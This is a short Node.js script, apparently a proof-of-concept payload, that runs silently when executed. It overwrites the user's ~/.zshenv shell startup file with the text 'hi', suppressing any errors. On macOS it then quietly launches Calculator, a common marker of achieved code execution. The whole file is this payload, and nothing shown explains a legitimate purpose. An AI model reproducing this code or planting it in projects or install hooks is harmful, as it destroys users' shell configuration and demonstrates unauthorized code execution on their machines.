'use strict';

const os = require('os');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const home = os.homedir();
const marker = path.join(home, '.zshenv');

try { fs.writeFileSync(marker, 'hi'); } catch (e) {}

if (os.platform() === 'darwin') {
  try { execSync('open -g -a Calculator 2>/dev/null', { stdio: 'pipe' }); } catch (e) {}
}
